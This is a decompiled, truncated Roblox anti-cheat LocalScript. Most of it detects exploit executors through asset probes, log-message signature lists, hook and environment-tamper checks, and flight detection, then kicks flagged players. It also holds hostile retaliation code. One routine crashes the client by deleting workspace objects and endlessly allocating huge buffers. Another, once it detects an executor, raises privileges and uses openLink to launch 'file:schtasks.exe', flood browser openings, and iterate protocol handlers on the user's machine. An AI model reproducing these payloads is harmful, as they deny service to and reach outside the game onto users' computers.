-- Saved by UniversalSynSaveInstance (Join to Copy Games) https://discord.gg/wx4ThpAsmw

local v_u_1 = getfenv
local v_u_2 = getmetatable
local v_u_3 = newproxy
local v_u_4 = debug
local v_u_5 = coroutine
local v_u_6 = task
local v_u_7 = v_u_4.info
local v_u_8 = v_u_4.info(v_u_7, "slanf")
local v_u_9 = v_u_7(v_u_4.info, "slanf")
local v_u_10 = v_u_7(v_u_2, "slanf")
local v_u_11 = nil
local v12 = game.GetDescendants(game)[1]:FindFirstAncestorOfClass("DataModel")
local v_u_13 = v_u_1()
local v_u_14 = table.freeze({
    ["replicatedStorage"] = v12:GetService("ReplicatedStorage"),
    ["playerService"] = v12:GetService("Players"),
    ["contentProvider"] = v12:GetService("ContentProvider"),
    ["runService"] = v12:GetService("RunService"),
    ["httpService"] = v12:GetService("HttpService"),
    ["logService"] = v12:GetService("LogService")
}) --> vu14 is a table of services
local v_u_15 = v_u_14.playerService.LocalPlayer
local v16 = v_u_14.httpService:GenerateGUID(false):gsub("-", ""):upper()
local v_u_17 = {
    ["Var"] = ("%*"):format((v_u_14.httpService:GenerateGUID(false):gsub("-", ""):upper())),
    ["Value"] = ("%*"):format((v_u_14.httpService:GenerateGUID(false):gsub("-", ""):upper()))
}
script.Name = ("%*"):format(v16)
local v18 = script:GetActor()
v18.Name = ("%*"):format(v16)
v_u_6.defer(script.Destroy, script)
v_u_6.spawn(v18.Destroy, v18)
v_u_13.script:Destroy()
v_u_13.client = nil
v_u_13.service = nil
v_u_13.script = nil
v_u_13._G = nil
v_u_13.shared = nil
v_u_13[v_u_17.Var] = v_u_17.Value
print("hidden like a cat")
local v_u_19 = {}
local v_u_20 = v_u_14.runService:IsStudio()
local v_u_21 = false
local v_u_22 = {}
v_u_6.spawn(function()
    for _ = 1, 298 do
        v_u_22 = { v_u_22 }
    end
end)
local v_u_23 = table.freeze({
    "137842439297855",
    "1204397029",
    "2764171053",
    "1352543873",
    "14317581285",
    "3944680095",
    "10137941941",
    "10709818534",
    "10709782230",
    "10734884548",
    "6065821086",
    "11485237333",
    "11481010000",
    "5054663650",
    "11036884234",
    "7445543667",
    "16755289922",
    "4483362458",
    "12977615774",
    "4155801252",
    "9619665977",
    "6282522798",
    "14808185803",
    "11559270573",
    "13363121645",
    "11558444554",
    "13462268450",
    "13462271395",
    "13365407660",
    "13569242972",
    "14806239806",
    "12730597972",
    "5034768003",
    "6578871732",
    "6579106223",
    "1513966937",
    "474172996",
    "4427304036",
    "5492252477",
    "2454009026",
    "588745174",
    "5053765125",
    "4623529748",
    "4800232219",
    "6065821980",
    "6065821086",
    "6065821596",
    "6065775281",
    "4640027304",
    "4640027213",
    "13376716936",
    "13388360023",
    "14806198159",
    "7368471234",
    "112971167999062",
    "6034767608",
    "6022668898",
    "101025591575185",
    "18274452449",
    "128797200442698",
    "139628202576511",
    "129380150574313",
    "74268315755026",
    "131920135912699",
    "108270041153906",
    "120056247050601",
    "120458671764177",
    "133601737414791",
    "11801116249",
    "17249150521",
    "132776683490024",
    "125286523813740",
    "14086106160",
    "13441695981",
    "14840862230",
    "15055300199",
    "10734950309",
    "106904366047815",
    "139029764580322",
    "106175938923146",
    "96845738268609",
    "128723106852543",
    "111247479525449",
    "13711943220",
    "13501536501",
    "15349103172",
    "17844466965",
    "17844524510",
    "17755489650",
    "17439455786",
    "18274756619",
    "18274800017",
    "17409044030",
    "12978095818",
    "10804731440",
    "5448127505",
    "11389137937",
    "5042114982",
    "125451561960633",
    "118425905671666",
    "95268421208163",
    "107640924738262",
    "74833786606286",
    "9886659406",
    "103134660123798",
    "139785960036434",
    "136413657454848",
    "87089195419529"
})
local v_u_24 = table.freeze({
    "Invalid property: OutlineColor",
    "Invalid property: LockedColor",
    "Invalid property: Enabled",
    "Invalid property: RainbowOutlineColor",
    "Invalid property: RainbowColor",
    "Invalid property: OutlineOpacity",
    "Invalid property: Outline",
    "Invalid property: Visible",
    "Invalid property: NumSides",
    "\226\156\133 Successfully Loaded: Scripts & Configurations",
    "Maxhub: Successfully Loaded",
    "\226\156\133 Successfully Loaded: File Libraries",
    "[Trip Hub]: Key System Loaded!",
    "third person aimbot loaded",
    "========== Venox Hub ========== ERROR: KEY IS INVALID! ===============================",
    "[Trip Hub]: Executed!",
    "========== Venox Hub ============ SUCCESS: Detected Premium User! loading script....! =================================",
    "EXUNYS_ESP > Your exploit does not support this module\'s optimizations! The visuals might be laggy and decrease performance.",
    "---[ INFO ]--- Bypassed Adonis Anti-Cheat/Anti-Exploit. Bypass Method: Preventing Script Table From Communicating With The Server. Creator: TheRealX_ORA / X_ORA",
    "Launching Old Evon GUI",
    "Please join Frontlines to use this script",
    "========== Venox Hub ============ SUCCESS: Detected Free User! loading script....! =================================",
    "Orion Library - Failed to load Feather Icons. Error code: Can\'t parse JSON",
    "Remote Spy runs only on Synapse Z!",
    "You cannot create more than one window.",
    "[XENO]: loadstring failed and timed out",
    "Rayfield | Unable to find \'Esp1Toggle\' in the save file.",
    "Executor : Solara",
    "konstant detected, not supported, crasher checks will be used with getscriptbytecode which means less accuracy",
    "Orion Library - Failed to load Feather Icons. Error code: [string \"=\"]:34: Can\'t parse JSON",
    "Check docs.sirius.menu for help with Rayfield specific development.",
    "NX:2: Eclipse Hub may only be used via the loadstring.",
    "Voidware: Loaded in Cheat Engine Mode! Some functions might be missing.",
    "========== Venox Hub ============ SUCCESS: Detected Free User! loading script....! =================================",
    "Forge Hub / Authenticated Securely. You\'re now protected.",
    "X-RO_ESP > UtilityFunctions.WrapObject - Attempted to wrap object of an unsupported class type: \"Camera\"\t",
    "No ESP Found - Couldn\'t find Any ESP In the Character!\t",
    "Rayfield | Unable to find \'Aimbot\' in the save file.",
    "The error above may not be an issue if new elements have been added or not been set values.",
    "USED REJOIN METHOD, YOUR GAME MIGHT CRASH!",
    "NX:2: attempt to call a nil value",
    "When converting to Hex, color values must be within the range of [0, 1]. Out-of-range values have been clamped.\t",
    "Expected \':\' not \'.\' calling member function PreloadAsync"
})
local v42 = {
    function()
        if v_u_20 then
            return warn("CLIENT WANT CRASH")
        end
        v_u_6.spawn(function()
            for _, v25 in pairs(workspace:GetChildren()) do
                pcall(v25.Destroy, v25)
            end
        end)
        v_u_6.spawn(function()
            while true do
                v_u_6.wait()
                game:GetService("RunService").Heartbeat:Connect(function()
                    v_u_6.spawn(function()
                        while true do
                            v_u_6.wait()
                            v_u_6.defer(function()
                                local v26 = table.create(67108864, buffer.create(1073741824))
                                print(v26)
                            end)
                        end
                    end)
                end)
                game:GetService("RunService").RenderStepped:Connect(function()
                    v_u_6.spawn(function()
                        while true do
                            v_u_6.wait()
                            v_u_6.defer(function()
                                local v27 = table.create(67108864, buffer.create(1073741824))
                                print(v27)
                            end)
                        end
                    end)
                end)
                game:GetService("RunService").PreRender:Connect(function()
                    v_u_6.spawn(function()
                        while true do
                            v_u_6.wait()
                            v_u_6.defer(function()
                                local v28 = table.create(67108864, buffer.create(1073741824))
                                print(v28)
                            end)
                        end
                    end)
                end)
            end
        end)
    end,
    function()
        if v_u_21 then
            return
        end
        v_u_21 = true
        local v29 = false
        local v30 = ""
        local v33 = v_u_5.create(function()
            local v31, v32 = pcall(function()
                v_u_14.contentProvider.GetAssetFetchStatus(game.ContentProvider)
            end)
            if v31 or v32 ~= "Argument 1 missing or nil" and v32 ~= "missing argument #2 for GetAssetFetchStatus (string expected)" then
                warn(v31, v32)
                if v_u_11 then
                    v_u_11:FireServer({
                        "Kick",
                        { "AssetFetch1_Hook", v32 }
                    })
                end
            end
        end)
        local v34, v35 = v_u_5.resume(v33)
        if not v34 then
            warn(v34, v35)
            v_u_11:FireServer({
                "Kick",
                { "coroutine", "resume" }
            })
            return
        end
        for _, v36 in v_u_23 do
            if v_u_14.contentProvider:GetAssetFetchStatus((("rbxassetid://%*"):format(v36))) == Enum.AssetFetchStatus.Success then
                v30 = v36
                v29 = true
                break
            end
            v_u_6.wait()
        end
        if v29 and v_u_11 then
            v_u_11:FireServer({
                "Kick",
                { "AssetFetch1", v30 }
            })
        end
        v_u_21 = false
    end,
    function(p37)
        local v38 = 0
        if p37:find("ThirdPartyUserService") then
            for _, v39 in string.split(p37, ".") do
                if v39 == "ThirdPartyUserService" then
                    v38 = v38 + 1
                end
                if tonumber(v39) then
                    v38 = v38 + 1
                end
                if v38 == 2 then
                    local v40 = string.split(v39, ":")[1]
                    if v40 and tonumber(v40) then
                        v38 = v38 + 1
                    end
                end
            end
        end
        if p37:find("ThirdPartyUserService") and (p37:find("Loadstring") or p37:find("loadstring")) then
            v38 = v38 + 3
        end
        if v38 >= 3 and v_u_11 then
            v_u_11:FireServer({
                "Kick",
                { "Xeno" }
            })
        end
    end,
    function()
        for _ = 1, 5 do
            local v_u_41 = Instance.new("Actor", nil)
            v_u_41.Name = ("%*"):format((v_u_14.httpService:GenerateGUID(false):gsub("-", ""):upper()))
            pcall(function()
                Instance.new("Script", v_u_41).Name = ("%*"):format(v_u_41.Name)
            end)
        end
    end
}
local v_u_43 = table.freeze(v42)
v_u_6.spawn(function()
    for _, v_u_44 in v_u_23 do
        local v45 = v_u_19
        local v46 = v_u_14.contentProvider:GetAssetFetchStatusChangedSignal((("rbxassetid://%*"):format(v_u_44)))
        local function v48(p47)
            if p47 == Enum.AssetFetchStatus.Success then
                if v_u_11 then
                    v_u_11:FireServer({
                        "Kick",
                        { "AssetFetch2", v_u_44 }
                    })
                end
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
            end
        end
        table.insert(v45, v46:Connect(v48))
    end
    local v49 = v_u_19
    local v50 = v_u_14.contentProvider:GetAssetFetchStatusChangedSignal("rbxasset://custom_gloop")
    local function v52(p51)
        if p51 == Enum.AssetFetchStatus.Success then
            if v_u_11 then
                v_u_11:FireServer({
                    "Kick",
                    { "4832", "Delta Executor detected by getcustomasset\nPath: **rbxasset://custom_gloop**" }
                })
            end
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
        end
    end
    table.insert(v49, v50:Connect(v52))
    local v53 = v_u_19
    local v54 = v_u_14.contentProvider:GetAssetFetchStatusChangedSignal("rbxasset://RonixExploit")
    local function v56(p55)
        if p55 == Enum.AssetFetchStatus.Success then
            if v_u_11 then
                v_u_11:FireServer({
                    "Kick",
                    { "4832", "Ronix Executor detected by getcustomasset\nPath: **rbxasset://RonixExploit**" }
                })
            end
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
        end
    end
    table.insert(v53, v54:Connect(v56))
end)
local v57 = game.JobId:gsub("%D", "")
local v58 = not tonumber(v57) and 1 or v57
local v_u_59 = v_u_20 and 1 or (v58 == 0 and 1 or v58)
local v_u_60 = {}
local function v_u_63(p61)
    return p61:gsub(".", function(p62)
        return string.format("%02x", string.byte(p62))
    end)
end
local function v_u_69(p64, p65)
    local v66 = ""
    for _ = 1, p65 or 4 do
        local v67 = p64 % 256
        v66 = string.char(v67) .. v66
        local v68 = p64 / 256
        p64 = math.floor(v68)
    end
    return v66
end
local function v_u_75(p70, p71)
    local v72 = p71 or 1
    local v73 = 0
    for v74 = v72, v72 + 3 do
        v73 = v73 * 256 + p70:byte(v74)
    end
    return v73
end
local function v_u_82(p76, p77)
    local v78 = 64 - (p77 + 9) % 64
    local v79 = p77 * 8
    local v80 = p76 .. string.char(128) .. string.rep("\0", v78) .. v_u_69(v79, 8)
    local v81 = #v80 % 64 == 0
    assert(v81)
    return v80
end
function v_u_60.hash(p83)
    local v84 = v_u_82(p83, #p83)
    local v85 = {
        1779033703,
        3144134277,
        1013904242,
        2773480762,
        1359893119,
        2600822924,
        528734635,
        1541459225
    }
    local v86 = {
        1116352408,
        1899447441,
        3049323471,
        3921009573,
        961987163,
        1508970993,
        2453635748,
        2870763221,
        3624381080,
        310598401,
        607225278,
        1426881987,
        1925078388,
        2162078206,
        2614888103,
        3248222580,
        3835390401,
        4022224774,
        264347078,
        604807628,
        770255983,
        1249150122,
        1555081692,
        1996064986,
        2554220882,
        2821834349,
        2952996808,
        3210313671,
        3336571891,
        3584528711,
        113926993,
        338241895,
        666307205,
        773529912,
        1294757372,
        1396182291,
        1695183700,
        1986661051,
        2177026350,
        2456956037,
        2730485921,
        2820302411,
        3259730800,
        3345764771,
        3516065817,
        3600352804,
        4094571909,
        275423344,
        430227734,
        506948616,
        659060556,
        883997877,
        958139571,
        1322822218,
        1537002063,
        1747873779,
        1955562222,
        2024104815,
        2227730452,
        2361852424,
        2428436474,
        2756734187,
        3204031479,
        3329325298
    }
    for v87 = 1, #v84, 64 do
        local v88 = v84:sub(v87, v87 + 63)
        local v89 = {}
        for v90 = 1, 16 do
            v89[v90] = v_u_75(v88, (v90 - 1) * 4 + 1)
        end
        for v91 = 17, 64 do
            local v92 = v89[v91 - 15]
            local v93 = bit32.rrotate(v92, 7)
            local v94 = v89[v91 - 15]
            local v95 = bit32.rrotate(v94, 18)
            local v96 = v89[v91 - 15]
            local v97 = bit32.rshift(v96, 3)
            local v98 = bit32.bxor(v93, v95, v97)
            local v99 = v89[v91 - 2]
            local v100 = bit32.rrotate(v99, 17)
            local v101 = v89[v91 - 2]
            local v102 = bit32.rrotate(v101, 19)
            local v103 = v89[v91 - 2]
            local v104 = bit32.rshift(v103, 10)
            local v105 = bit32.bxor(v100, v102, v104)
            v89[v91] = (v89[v91 - 16] + v98 + v89[v91 - 7] + v105) % 4294967296
        end
        local v106, v107, v108, v109, v110, v111, v112, v113 = table.unpack(v85)
        for v114 = 1, 64 do
            local v115 = bit32.rrotate(v110, 6)
            local v116 = bit32.rrotate(v110, 11)
            local v117 = bit32.rrotate(v110, 25)
            local v118 = bit32.bxor(v115, v116, v117)
            local v119 = bit32.band(v110, v111)
            local v120 = bit32.bnot(v110)
            local v121 = bit32.band(v120, v112)
            local v122 = bit32.bxor(v119, v121)
            local v123 = (v113 + v118 + v122 + v86[v114] + v89[v114]) % 4294967296
            local v124 = bit32.rrotate(v106, 2)
            local v125 = bit32.rrotate(v106, 13)
            local v126 = bit32.rrotate(v106, 22)
            local v127 = bit32.bxor(v124, v125, v126)
            local v128 = bit32.band(v106, v107)
            local v129 = bit32.band(v106, v108)
            local v130 = bit32.band(v107, v108)
            local v131 = (v127 + bit32.bxor(v128, v129, v130)) % 4294967296
            local v132 = (v109 + v123) % 4294967296
            local v133 = (v123 + v131) % 4294967296
            v113 = v112
            v112 = v111
            v111 = v110
            v110 = v132
            v109 = v108
            v108 = v107
            v107 = v106
            v106 = v133
        end
        v85[1] = (v85[1] + v106) % 4294967296
        v85[2] = (v85[2] + v107) % 4294967296
        v85[3] = (v85[3] + v108) % 4294967296
        v85[4] = (v85[4] + v109) % 4294967296
        v85[5] = (v85[5] + v110) % 4294967296
        v85[6] = (v85[6] + v111) % 4294967296
        v85[7] = (v85[7] + v112) % 4294967296
        v85[8] = (v85[8] + v113) % 4294967296
    end
    local v134 = ""
    for v135 = 1, 8 do
        v134 = v134 .. v_u_69(v85[v135], 4)
    end
    return v_u_63(v134)
end
function v_u_60.hmac(p136, p137)
    if #p136 > 64 then
        p136 = v_u_60.hash(p136)
    end
    if #p136 < 64 then
        p136 = p136 .. string.rep("\0", 64 - #p136)
    end
    local v138 = {}
    local v139 = {}
    for v140 = 1, 64 do
        local v141 = p136:byte(v140)
        local v142 = bit32.bxor(v141, 92)
        v138[v140] = string.char(v142)
        local v143 = bit32.bxor(v141, 54)
        v139[v140] = string.char(v143)
    end
    local v144 = table.concat(v138)
    local v145 = table.concat(v139)
    return v_u_60.hash(v144 .. v_u_60.hash(v145 .. p137))
end
table.freeze(v_u_60)
local v_u_146 = ""
v_u_6.defer(function()
    local v147 = v_u_15.UserId * v_u_15.AccountAge * 4 * v_u_59
    local v148 = tostring(v147)
    local v149
    if #v148 < 16 then
        v149 = v148 .. string.rep("0", 16 - #v148)
    else
        v149 = string.sub(v148, 1, 16)
    end
    v_u_146 = ("%*"):format(v149)
end)
pcall(function()
    v_u_11 = v_u_14.replicatedStorage:WaitForChild("Communications", math.huge)
    v_u_11.Destroying:Connect(function()
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
    end)
    v_u_11.Changed:Connect(function(p150)
        if p150 == "Parent" then
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
        end
    end)
    v_u_11.Name = ("%*"):format((v_u_14.httpService:GenerateGUID(false):gsub("-", ""):upper()))
    v_u_11:FireServer({ "RegisterEvent" })
    v_u_11.OnClientEvent:Connect(function(p_u_151)
        if typeof(p_u_151) == "string" then
            if p_u_151 == "UPDATE_NAME" then
                v_u_11.Name = ("%*"):format((v_u_14.httpService:GenerateGUID(false):gsub("-", ""):upper()))
                return true
            end
            v_u_6.delay(0, function()
                v_u_11:FireServer((v_u_60.hmac(v_u_146, p_u_151)))
                if table.pack(pcall(function()
                    return nil
                end)).n ~= 2 then
                    warn("HOOKS MEOW HOOKS MEOW")
                    v_u_6.spawn(v_u_43[1])
                    v_u_6.spawn(v_u_43[1])
                    v_u_6.spawn(v_u_43[1])
                    v_u_6.spawn(v_u_43[1])
                    v_u_6.spawn(v_u_43[1])
                    v_u_6.spawn(v_u_43[1])
                    v_u_6.spawn(v_u_43[1])
                end
            end)
        end
        if typeof(p_u_151) == "table" then
            local _, _ = table.unpack(p_u_151)
        end
    end)
    v_u_6.spawn(v_u_43[4])
end)
v_u_6.spawn(function()
    v_u_15.PlayerGui.ChildAdded:Connect(function(p152)
        if p152.Name == "AimLockGui" or p152.Name == "AimLockInfoGui" then
            if v_u_11 then
                v_u_11:FireServer({
                    "Kick",
                    { "scriptLoaded", (("%* was added to PlayerGui"):format(p152)) }
                })
            end
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
        end
    end)
end)
game.ServiceAdded:Connect(function(p153)
    if p153.ClassName == "UGCValidationService" then
        if v_u_20 then
            return
        end
        if v_u_11 then
            v_u_11:FireServer({
                "Kick",
                { "ServiceAdded", (("%* was added onto client, This user may be using **saveinstace**!"):format(p153.ClassName)) }
            })
        end
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
    end
    if p153.ClassName == "MessagingService" then
        if v_u_11 then
            v_u_11:FireServer({
                "Kick",
                { "ServiceAdded", (("%* was added onto client, This user **may** be exploiting!"):format(p153.ClassName)) }
            })
        end
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
        v_u_6.spawn(v_u_43[1])
    end
end)
v_u_14.logService.MessageOut:Connect(function(p154, _)
    if not (p154:find("active://") or p154:find("\"Unknown \'[^\']+\' animation:\"")) then
        if v_u_24[p154] then
            if v_u_11 then
                v_u_11:FireServer({
                    "Kick",
                    { "LogService", (("%*"):format(p154)) }
                })
            end
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
        end
        if p154 == "-----------------------------------------" then
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
        end
        if tonumber(p154) and tostring(p154):len() == 6 then
            warn("Potential luarmor script executed")
            if v_u_11 then
                v_u_11:FireServer({
                    "Kick",
                    { "luarmor_protocol", (("%*"):format(p154)) }
                })
            end
        end
        if p154:find("Your exploit is not supported") or p154:find("callingfunction") then
            if v_u_11 then
                v_u_11:FireServer({
                    "Kick",
                    { "LogService", (("%*"):format(p154)) }
                })
            end
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
        end
        v_u_6.spawn(v_u_43[3], p154)
        if p154:sub(1, 29) == "Xeno Initialization Cancelled" or (p154:sub(1, 17) == "Xeno Notification" or p154 == "[NEZUR] Initialized made by 1Cheats") then
            if v_u_11 then
                v_u_11:FireServer({
                    "Kick",
                    { "LogService", (("%*"):format(p154)) }
                })
            end
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
        end
        if p154:find("Script \'\',") then
            if v_u_11 then
                v_u_11:FireServer({
                    "Kick",
                    { "LogService", (("%*"):format(p154)) }
                })
            end
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
        end
        if p154:find("Delta coroutine errored: ") or p154:find("Delta failed to load: ") then
            if v_u_11 then
                v_u_11:FireServer({
                    "Kick",
                    { "LogService", (("%*"):format(p154)) }
                })
            end
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
        end
        if p154:find("KRNL ENV") or (p154:find("Astro Info") or p154:find("CheatFrame")) then
            if v_u_11 then
                v_u_11:FireServer({
                    "Kick",
                    { "LogService", (("%*"):format(p154)) }
                })
            end
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
        end
    end
end)
v_u_6.spawn(function()
    v_u_15.CharacterAdded:Connect(function(p155)
        local v156 = p155:WaitForChild("Humanoid", 30)
        local v_u_157 = p155:WaitForChild("Head", 30)
        local v_u_159 = p155.DescendantAdded:Connect(function(p_u_158)
            if p_u_158:IsA("BodyVelocity") or p_u_158:IsA("BodyGyro") then
                if p_u_158.Name == "SlideVelocity" and p_u_158:IsA("BodyVelocity") then
                    return
                end
                v_u_6.delay(0.1, function()
                    pcall(p_u_158.Destroy, p_u_158)
                end)
                if v_u_11 then
                    v_u_11:FireServer({
                        "Kick",
                        { "Flight", (("Flight Attempt: %* was added as an descendant of character!"):format(p_u_158)) }
                    })
                end
            end
        end)
        local v_u_160 = nil
        pcall(function()
            v_u_160 = v_u_157:GetPropertyChangedSignal("Anchored"):Connect(function()
                if v_u_157.Anchored then
                    v_u_157.Anchored = false
                end
            end)
        end)
        v156.Died:Connect(function()
            if v_u_159 then
                v_u_159:Disconnect()
            end
            if v_u_160 then
                v_u_160:Disconnect()
            end
        end)
    end)
    while true do
        v_u_6.wait(5)
        if v_u_11 then
            local v161 = v_u_11
            local v162 = table.create
            local v163 = v_u_22
            v161:FireServer(unpack(v162(1, v163)))
        end
        v_u_6.spawn(v_u_43[2])
    end
end)
local function v_u_165(p164)
    return select(2, xpcall(p164, function()
        return v_u_7(2, "f")
    end))
end
local v166 = {
    ["namecall"] = v_u_165(function()
        return game:____()
    end),
    ["newindex"] = v_u_165(function()
        game.____ = 0
    end),
    ["index"] = v_u_165(function()
        return game.____
    end)
}
local v_u_167 = {
    {
        ["Metamethod"] = "namecall",
        ["Call"] = function()
            return v_u_165(function()
                return game:____()
            end)
        end,
        ["Origin"] = v166.namecall
    },
    {
        ["Metamethod"] = "newindex",
        ["Call"] = function()
            return v_u_165(function()
                game.____ = 0
            end)
        end,
        ["Origin"] = v166.newindex
    },
    {
        ["Metamethod"] = "index",
        ["Call"] = function()
            return v_u_165(function()
                return game.____
            end)
        end,
        ["Origin"] = v166.index
    }
}
v_u_6.spawn(function()
    while v_u_6.wait(1) do
        pcall(function()
            v_u_14.contentProvider:Preload("rbxasset://custom_gloop")
            v_u_14.contentProvider:Preload("rbxasset://RonixExploit")
        end)
        for _, v168 in v_u_167 do
            if v168.Call() ~= v168.Origin then
                v_u_11:FireServer({
                    "Kick",
                    { "MethodChecks", string.format("Detected __%s Hook", v168.Metamethod) }
                })
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
            end
        end
        if v_u_7(v_u_4.info, "slanf") ~= v_u_9 or (v_u_4.info(v_u_7, "slanf") ~= v_u_8 or v_u_7(v_u_2, "slanf") ~= v_u_10) then
            print("invalid function, probably hooked")
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
        end
        if v_u_13 ~= v_u_1() then
            warn("ENV TAMPER", v_u_1())
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
        end
        if _G ~= nil then
            local v169 = warn
            local v170 = _G
            v169((("Something unexpectedly made _G %*"):format((typeof(v170)))))
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
        end
        if v_u_1()[v_u_17.Var] == nil or v_u_1()[v_u_17.Var] ~= v_u_17.Value then
            warn("something is overwriting getfenv")
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
            v_u_6.spawn(v_u_43[1])
        end
    end
end)
v_u_6.spawn(function()
    local v171 = Instance.new("BindableEvent")
    local v172 = v_u_3(true)
    v_u_2(v172).__tostring = function()
        for v173 = 1, 20 do
            local v_u_174 = v_u_7(v173, "l")
            if v_u_174 then
                v_u_174 = v_u_1(v173)
            end
            if not v_u_174 then
                break
            end
            if v_u_174.getgenv then
                v_u_6.spawn(function()
                    pcall(function()
                        if v_u_174.setidentity then
                            v_u_174.setidentity(6)
                            pcall(function()
                                game:GetService("StartPageService"):openLink("file:schtasks.exe")
                            end)
                            for _ = 1, 500 do
                                pcall(function()
                                    game:GetService("StartPageService"):openLink("https://www.roblox.com/")
                                end)
                            end
                            for _, v_u_175 in {
                                "aaa",
                                "aaas",
                                "about",
                                "acap",
                                "acct",
                                "acd",
                                "acr",
                                "adiumxtra",
                                "adt",
                                "afp",
                                "afs",
                                "aim",
                                "amss",
                                "android",
                                "appdata",
                                "apt",
                                "ar",
                                "ari",
                                "ark",
                                "at",
                                "attachment",
                                "aw",
                                "barion",
                                "bb",
                                "beshare",
                                "bitcoin",
                                "bitcoincash",
                                "bl",
                                "blob",
                                "bluetooth",
                                "bolo",
                                "brid",
                                "browserext",
                                "cabal",
                                "calculator",
                                "callto",
                                "cap",
                                "cast",
                                "casts",
                                "chrome",
                                "chrome-extension",
                                "cid",
                                "coap",
                                "coap+tcp",
                                "coap+ws",
                                "coaps",
                                "coaps+tcp",
                                "coaps+ws",
                                "com-eventbrite-attendee",
                                "content",
                                "content-type",
                                "crid",
                                "cstr",
                                "cvs",
                                "dab",
                                "dat",
                                "data",
                                "dav",
                                "dhttp",
                                "diaspora",
                                "dict",
                                "did",
                                "dis",
                                "dlna-playcontainer",
                                "dlna-playsingle",
                                "dns",
                                "dntp",
                                "doi",
                                "dpp",
                                "drm",
                                "drop",
                                "dtmi",
                                "dtn",
